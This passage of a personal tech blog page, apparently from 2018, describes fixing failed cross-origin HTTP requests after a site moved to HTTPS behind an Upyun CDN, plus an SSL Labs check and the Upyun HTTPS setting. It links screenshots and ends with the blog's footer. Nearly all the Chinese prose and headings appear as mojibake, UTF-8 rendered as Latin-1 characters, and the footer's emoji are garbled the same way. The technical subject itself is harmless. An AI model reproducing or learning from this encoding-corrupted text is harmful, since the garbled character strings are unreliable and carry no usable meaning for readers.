<p>å¯æ˜¯æˆ‘ä¸€å¼€å§‹æ²¡æœ‰è¿™ä¹ˆé¡ºåˆ©å®ç°æˆ‘æƒ³è¦çš„æ•ˆæœï¼Œå› ä¸ºçš„ç¡®è¯ä¹¦æ˜¯æœ‰äº†è®¿é—®å¯ä»¥httpså¯æ˜¯è¯·æ±‚è·¨åŸŸhttpæœåŠ¡å°±å‡ºç°é—®é¢˜äº†ã€‚<br>è¿™é‡Œæˆ‘æ˜¯åœ¨åˆæ‹äº‘åšCDNåŠ é€Ÿçš„ï¼Œæ‰€ä»¥è¿™é‡Œè¯´æ˜ä¸‹å¦‚æœä½ çš„å…¬å¸ç½‘ç«™æ¯”å¦‚è¯´ï¼šihaozhuo.com<br>é‚£ä¹ˆè¯·æ±‚çš„æ—¶å€™<a href="https://ihaozhuo.com" target="_blank" rel="external">https://ihaozhuo.com</a> å‡ºç°æˆ‘ä¸‹é¢åŒæ ·çš„é—®é¢˜:</p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/Nginx4.png" alt=""></figure><br><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/Nginx5.png" alt=""></figure><br><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/Nginx6.png" alt=""></figure></p>
<h4 id="è¿™æ˜¯æˆ‘æ˜¾ç¤ºçš„é”™è¯¯å›¾ç‰‡å½“åˆæˆªå›¾ç•™ä¸‹è®°å½•æˆæ–‡æ¡£äº†ã€‚"><a href="#è¿™æ˜¯æˆ‘æ˜¾ç¤ºçš„é”™è¯¯å›¾ç‰‡å½“åˆæˆªå›¾ç•™ä¸‹è®°å½•æˆæ–‡æ¡£äº†ã€‚" class="headerlink" title="è¿™æ˜¯æˆ‘æ˜¾ç¤ºçš„é”™è¯¯å›¾ç‰‡å½“åˆæˆªå›¾ç•™ä¸‹è®°å½•æˆæ–‡æ¡£äº†ã€‚"></a>è¿™æ˜¯æˆ‘æ˜¾ç¤ºçš„é”™è¯¯å›¾ç‰‡å½“åˆæˆªå›¾ç•™ä¸‹è®°å½•æˆæ–‡æ¡£äº†ã€‚</h4><p>è¿™é‡Œæˆ‘ä¹Ÿåšäº†HTTPSå®‰å…¨æ£€æµ‹ï¼š<a href="https://www.ssllabs.com/ssltest" target="_blank" rel="external">https://www.ssllabs.com/ssltest</a> </p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/Nginx-ssl.png" alt=""></figure></p>
<h3 id="å¦‚ä½•è§£å†³ï¼š"><a href="#å¦‚ä½•è§£å†³ï¼š" class="headerlink" title="å¦‚ä½•è§£å†³ï¼š"></a>å¦‚ä½•è§£å†³ï¼š</h3><p>è¿™é‡Œæˆ‘é—®å‰ç«¯çš„ä»£ç é™æ€èµ„æºä¸Šé¢è¯·æ±‚upyunçš„httpå»è®¿é—®ï¼Œè¿™é‡Œæˆ‘ä»¬åœ¨upyunå¯¹è¯·æ±‚åŸŸåè®¾ç½®httpsæ–¹æ³•ï¼š</p>
<p>upyunå¯¹åº”çš„æœåŠ¡åˆ—è¡¨è®¾ç½®é‡Œé¢é€‰æ‹©httpsè®¾ç½®</p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/Nginx7.png" alt=""></figure><br><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/Nginx8.png" alt=""></figure><br><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/Nginx9.png" alt=""></figure></p>
<p>é…ç½®å¥½ä»¥åå°±å¯ä»¥ç”Ÿæ•ˆäº†ã€‚</p>
<p>è¿™é‡Œéœ€è¦æŠŠåœ°å€ç»™åˆ°å‰ç«¯è®©ä»–ä»¬åœ¨ä»£ç ä¸Šé¢ä¿®æ”¹ä¸‹HTTPS æ›´æ–°ä¸‹æœåŠ¡é‡å¯å°±å‡ºç°è®¿é—®æ­£å¸¸äº†ã€‚<br><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/Nginx10.png" alt=""></figure></p>

	

	

</article>





	<span class="different-posts">ğŸ“– <a href="/page/7">more posts</a> ğŸ“–</span>



	</main>

	<footer class="footer">
	<div class="footer-content">
		
	      <div class="footer__element">
	<h5>Hi there,</h5>
	<p style="text-align:justify;">my name is Yancy, they know me as RadiantğŸ‘ğŸ‘. This blog is about Bi-data and my live.<br> I like ğŸŒ³ğŸŒ³ğŸŒ³</p>
</div>


	    
	      <div class="footer__element">
	<h5>Check out</h5>
	<ul class="footer-links">
		<li class="footer-links__link"><a href="/archives">Archive</a></li>
		
		  <li class="footer-links__link"><a href="/atom.xml">RSS</a></li>
	    
		<li class="footer-links__link"><a href="/about">about page</a></li>
		<li class="footer-links__link"><a href="/tags">Tags</a></li>
		<li class="footer-links__link"><a href="/categories">Categories</a></li>
	</ul>
</div>

	    

		<div class="footer-credit">
			<span>Â© 2018 Yancy | Powered by <a href="http://blog.yancy.cc/">Yancy</a> | Theme <a href="https://github.com/yangcvo">Yancy_GitHub</a></span>
		</div>

	</div>


</footer>



</body>

</html>
